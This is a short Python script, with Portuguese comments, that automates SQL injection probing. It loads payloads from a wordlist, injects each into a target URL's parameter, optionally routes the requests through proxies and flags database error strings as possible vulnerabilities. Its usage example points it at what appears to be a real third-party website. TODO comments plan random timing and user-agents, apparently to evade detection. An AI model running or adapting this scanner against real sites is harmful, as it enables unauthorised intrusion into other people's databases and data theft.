from datetime import datetime as dt
import time

import functions

def sqli(url, file, timeout=10, SSL=True, proxies=None, interval=5, advanced=False):

    # tornar o modo advanced uma forma de reconhecimento do sql
    # colocar um intervalo randomico
    # colocar um gerador de user-agent randomico
    # alterar o test_url para que aceite http tambem
    # verificar como retornar dados do ssl
    
    sql_errors = [
        'You have an error in your SQL syntax',
        'Warning: mysql',
        'Unclosed quotation mark',
        'SQLSTATE',
        'syntax error',
        'SQL syntax',
        'mysql',
        'warning',
        'SQL syntax',
    ]
    
    payloads = functions.fileReader(file)
    if not payloads:
        print(f'[-] Nao encontrado: {file}')
        return False, f'[-] Nao encontrado: {file}'
    
    for payload in payloads:
        payload = payload.strip()
        test_url = f'https://{url}'.replace('*', payload)

        time.sleep(interval) # intervalo entre requisicoes
        time_now = dt.now().strftime('%d/%m/%Y %H:%M:%S') # hora atual

        status, r = functions.request(test_url, timeout=timeout, SSL=SSL, proxies=proxies) # requisicao
        
        if status:
            print(f'[-][{time_now}][{r.status_code}] Tentando: {test_url}')
            for error in sql_errors:
                if error.lower() in r.text.lower():
                    print(f'[+][{time_now}][{r.status_code}] Possível vulnerabilidade: {url} -> {payload}')
                    return True, f'[+][{time_now}][{r.status_code}] Possível vulnerabilidade: {url} -> {payload}'
        else:
            print(f'[-][{time_now}] {r}')
    
    return False, f'[-][{time_now}] Nenhuma vulnerabilidade encontrada'

# Exemplo de uso:
status, attk = sqli('www.socasadas.com/?s=*',
    '/home/maserati/Downloads/Python/wx78/wordlists/sqli/injection.txt',
)

print(attk)